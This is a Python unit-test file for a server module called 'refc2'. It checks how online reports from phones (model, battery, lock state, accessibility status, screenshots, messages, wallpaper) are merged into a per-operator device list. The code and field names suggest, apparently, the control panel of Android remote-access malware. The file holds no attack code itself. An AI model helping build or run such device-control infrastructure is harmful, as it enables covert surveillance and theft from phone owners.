import base64
import unittest

from server import api_impl, refc2


class DeviceOnlineProjectionTests(unittest.TestCase):
    def setUp(self):
        self.old_devices = refc2.STATE['devices']
        self.old_users = api_impl.S.get('users')

    def tearDown(self):
        refc2.STATE['devices'] = self.old_devices
        api_impl.S['users'] = self.old_users

    def test_native_21_device_online_populates_list_projection(self):
        rec = {
            'apkid': '10020', 'last_seen': 100, 'first_seen': 90,
            'ws': object(), 'caps': {}, 'shots': [], 'msgs': [],
        }
        refc2._merge_device_online(rec, {
            'deviceId': 'dev-1',
            'deviceInfo': {
                'brand': 'samsung', 'model': 'SM-G981V', 'version': 33,
                'area': 'CN', 'network': '5G', 'battery': 25,
                'charging': True, 'screen': 2400, 'lock': 0, 'acc': True,
                'appName': '测试', 'apkVer': '2.1', 'pkg': 'com.ref.test',
                'wallpaper': base64.b64encode(b'\xff\xd8\xffdemo').decode(),
            },
        })
        refc2.STATE['devices'] = {'dev-1': rec}
        row = refc2.device_rows()[0]
        self.assertEqual(row['appName'], '测试')
        self.assertEqual(row['brand'], 'samsung')
        self.assertEqual(row['model'], 'SM-G981V')
        self.assertEqual(row['androidVersion'], 33)
        self.assertEqual(row['network'], '5G')
        self.assertEqual(row['battery'], 25)
        self.assertTrue(row['accessibility'])
        self.assertEqual(row['extra']['deviceInfo']['apkVer'], '2.1')
        self.assertEqual(refc2._resolve_device_owner('', '10020', [
            {'username': 'admin', 'apkId': '10020'},
            {'username': 'mtx', 'apkId': '10020'},
        ]), 'mtx')

    def test_wallpaper_decoder_returns_real_image_mime(self):
        jpg = b'\xff\xd8\xfftest'
        raw, mime = refc2._wallpaper_bytes({
            'wallpaper_b64': 'data:image/jpeg;base64,' + base64.b64encode(jpg).decode()
        })
        self.assertEqual(raw, jpg)
        self.assertEqual(mime, 'image/jpeg')


if __name__ == '__main__':
    unittest.main()
